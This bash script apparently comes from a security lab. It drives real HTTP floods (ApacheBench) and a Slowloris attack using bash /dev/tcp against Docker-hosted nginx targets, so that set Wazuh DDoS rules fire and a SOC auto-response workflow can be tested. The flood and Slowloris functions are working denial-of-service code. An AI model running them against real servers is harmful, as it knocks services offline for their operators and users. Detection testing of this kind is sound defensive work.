#!/usr/bin/env bash
# Generates REAL traffic against the DMZ nginx targets, calibrated to land
# each of the three ddos_score_alert.py decision bands via genuine Wazuh
# rule firings (rules 100200/100210/100213 and 100211/100212 — see
# roles/wazuh_ddos_rules/files/local_rules_ddos.xml) — not synthetic
# webhook payloads. For direct synthetic testing of the scoring code
# itself, see ./test_scoring.sh instead.
#
# Usage:
#   ./run_attack.sh [ubuntu|windows|both] [log_only|notify_soc|auto_block]
#
# Examples:
#   ./run_attack.sh ubuntu log_only
#   ./run_attack.sh ubuntu notify_soc
#   ./run_attack.sh ubuntu auto_block
#   ./run_attack.sh both auto_block
#
# How each case is engineered against the ACTUAL rule chain + scoring
# (verified live during development — see README.md §5-6):
#
#   log_only   - a short/light HTTP burst. Fires rule 100210 (level 8,
#                D1=+0) a handful of times but never sustains long enough
#                to reach 100213 (needs 50x 100210 in 30s). D1+D2 tops out
#                at 30 (D2's max +30 needs >=20 historical hits) — always
#                < 40, so this can never accidentally escalate.
#
#   auto_block - a heavy sustained flood. Reliably reaches rule 100213
#                (level 12, D1=+40). Because wazuh_history counts ANY
#                indexed alert for that srcip (no rule-id filter), by the
#                time 50 100210 hits have accumulated (required for 100213
#                to fire at all) the 24h history for that IP is already
#                >=20 (D2=+30) -> 40+30=70 -> AUTO_BLOCK. In other words:
#                once real flood traffic is heavy enough to trigger 100213
#                at all, it ALWAYS also satisfies D2's top bucket, so this
#                path can never land on NOTIFY_SOC — verified live.
#
#   notify_soc - NOT reachable via the flood rules at all (see above), so
#                this drives real Slowloris traffic instead: dozens of
#                concurrent incomplete HTTP requests held open via bash's
#                /dev/tcp, until nginx's client_header_timeout (default
#                60s, unconfigured on both targets) expires and it logs a
#                genuine 408 for each. That's rule 100211 (level 1, base
#                tag, invisible below Wazuh's alert_log_level=3) ->
#                100212 (level 10, freq 50/30s, D1=+25 -- capped there,
#                100212 can NEVER reach AUTO_BLOCK on its own even with
#                max history: 25+30=55). A short warm-up flood runs first
#                so the srcip already has >=5 indexed alerts (D2=+20) by
#                the time the Slowloris burst's 100212 alert scores --
#                otherwise a truly fresh IP would land at 25 (LOG_ONLY),
#                one dimension short. This case takes ~75s wall-clock
#                because it's waiting on nginx's real timeout, not a
#                shortcut — it's driving an actual (if crude) Slowloris
#                attack.

set -euo pipefail

TARGET="${1:-both}"
CASE="${2:-auto_block}"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
STATE_FILE="$SCRIPT_DIR/.last_ip_octet"
IMAGE_NAME="ddos-attacker:latest"
CONTAINER_NAME="ddos-attacker"
UBUNTU_NET="dmz-ubuntu_default"
WINDOWS_NET="windows-dmz_default"

# .2 is always the real target on both /16 networks, .3 is the old
# compose-managed attacker identity — stay well clear of both.
IP_MIN=10
IP_MAX=250

case "$TARGET" in
    ubuntu|windows|both) ;;
    *)
        echo "Usage: $0 [ubuntu|windows|both] [log_only|notify_soc|auto_block]" >&2
        exit 1
        ;;
esac
case "$CASE" in
    log_only|notify_soc|auto_block) ;;
    *)
        echo "Usage: $0 [ubuntu|windows|both] [log_only|notify_soc|auto_block]" >&2
        exit 1
        ;;
esac

# ── Pick a source IP this run has never used before ─────────────────────────
last="$IP_MIN"
[[ -f "$STATE_FILE" ]] && last="$(cat "$STATE_FILE")"
octet=$((last + 1))
(( octet > IP_MAX )) && octet="$IP_MIN"
echo "$octet" > "$STATE_FILE"

UBUNTU_IP="172.23.0.$octet"
WINDOWS_IP="172.21.0.$octet"
echo "=== This run's attacker identity: dmz-ubuntu-side=$UBUNTU_IP  windows-side=$WINDOWS_IP ==="

# ── Build the attack image once; near-instant on every run after that ──────
if [[ -z "$(docker images -q "$IMAGE_NAME" 2>/dev/null)" ]]; then
    echo "Building $IMAGE_NAME (one-time, has curl + ab baked in)..."
    docker build -q -t "$IMAGE_NAME" "$SCRIPT_DIR" >/dev/null
fi

# ── Replace last run's ephemeral attacker container ─────────────────────────
docker rm -f "$CONTAINER_NAME" >/dev/null 2>&1 || true
docker run -d --name "$CONTAINER_NAME" \
    --network "$UBUNTU_NET" --ip "$UBUNTU_IP" \
    "$IMAGE_NAME" >/dev/null
docker network connect --ip "$WINDOWS_IP" "$WINDOWS_NET" "$CONTAINER_NAME"

pre_check() {
    local name="$1" url="$2"
    if ! docker exec "$CONTAINER_NAME" curl -s -o /dev/null -w "pre-check ($name): HTTP %{http_code}\n" --max-time 5 "$url"; then
        echo "WARNING: $name did not respond to a pre-check request — continuing anyway." >&2
    fi
}

flood_by_count() {
    # Hard-capped request count — needed for log_only: this nginx/backend
    # is fast enough that even a short -t window can race through tens of
    # thousands of requests and accidentally trip 100213 (verified live:
    # an 8s/-c60 -t-bounded burst did 50000 requests and fired 100213 21
    # times). A fixed low -n is the only reliable way to stay light.
    local url="$1" n="$2" concurrency="$3"
    docker exec "$CONTAINER_NAME" ab -n "$n" -c "$concurrency" "$url" 2>&1 \
        | grep -E "Complete requests|Failed requests|Requests per second|Time taken"
}

flood_by_time() {
    # -n set far above what concurrency*duration could realistically reach,
    # so -t (wall-clock time) is what actually bounds the run.
    local url="$1" duration="$2" concurrency="$3"
    docker exec "$CONTAINER_NAME" ab -n 1000000 -c "$concurrency" -t "$duration" "$url" 2>&1 \
        | grep -E "Complete requests|Failed requests|Requests per second|Time taken"
}

slowloris() {
    # Opens $2 concurrent incomplete HTTP requests to $host:80 via bash's
    # /dev/tcp (no netcat/python needed) and holds them until nginx's
    # client_header_timeout fires a real 408 for each. Runs INSIDE the
    # attacker container in one docker exec so all connections originate
    # from its assigned IP and background cheaply as subshells of the
    # same bash process.
    local host="$1" n="$2"
    echo "Opening $n incomplete connections to $host:80 (nginx default client_header_timeout ~60s)..."
    docker exec "$CONTAINER_NAME" bash -c "
        for i in \$(seq 1 $n); do
            (
                exec 3<>/dev/tcp/$host/80 2>/dev/null || exit 0
                printf 'GET / HTTP/1.1\r\n' >&3
                sleep 65
                exec 3<&- 2>/dev/null
                exec 3>&- 2>/dev/null
            ) &
        done
        wait
    "
    echo "Slowloris burst complete — all connections should have timed out by now."
}

run_case() {
    local name="$1" host="$2" url="$3"
    echo "=== [$CASE] $name ($url) ==="
    pre_check "$name" "$url"
    case "$CASE" in
        log_only)
            flood_by_count "$url" 250 20
            ;;
        auto_block)
            flood_by_time "$url" 30 150
            ;;
        notify_soc)
            echo "-- warm-up flood (builds >=5 indexed 100210 hits for D2) --"
            # A single instant burst is unreliable here: 250 near-simultaneous
            # requests can collapse into anywhere from 2 to 18+ separate
            # 100210 firings depending on system-load timing jitter alone
            # (verified live — identical params, wildly different counts).
            # Six separate bursts 2s apart forces each one to individually
            # cross the 100-req/10s threshold, giving a deterministic ~6
            # firings regardless of scheduling variance, while staying far
            # below the 50-hits/30s needed to accidentally trip 100213.
            for _ in 1 2 3 4 5 6; do
                flood_by_count "$url" 150 20 >/dev/null
                sleep 2
            done
            echo "Waiting 5s for the warm-up alerts to index..."
            sleep 5
            echo "-- Slowloris burst (drives real rule 100211 -> 100212) --"
            slowloris "$host" 60
            ;;
    esac
    echo
}

case "$TARGET" in
    ubuntu)  run_case "dmz-ubuntu" "dmz-ubuntu" "http://dmz-ubuntu:80/" ;;
    windows) run_case "dmz-windows" "windows" "http://windows:80/" ;;
    both)
        run_case "dmz-ubuntu" "dmz-ubuntu" "http://dmz-ubuntu:80/"
        run_case "dmz-windows" "windows" "http://windows:80/"
        ;;
esac

cat <<EOF
Done. Source IPs used this run: dmz-ubuntu-side=$UBUNTU_IP  windows-side=$WINDOWS_IP
Next run will use a fresh, never-before-cached IP automatically.

Check for alerts on the SOC host:
  docker exec single-node-wazuh.manager-1 tail -f /var/ossec/logs/alerts/alerts.json | grep -E '"id":"1002(10|11|12|13)"'

Or watch the Shuffle DDoS workflow pick them up:
  Shuffle UI -> Workflows -> "Wazuh DDoS Auto-Response" -> Runs
EOF
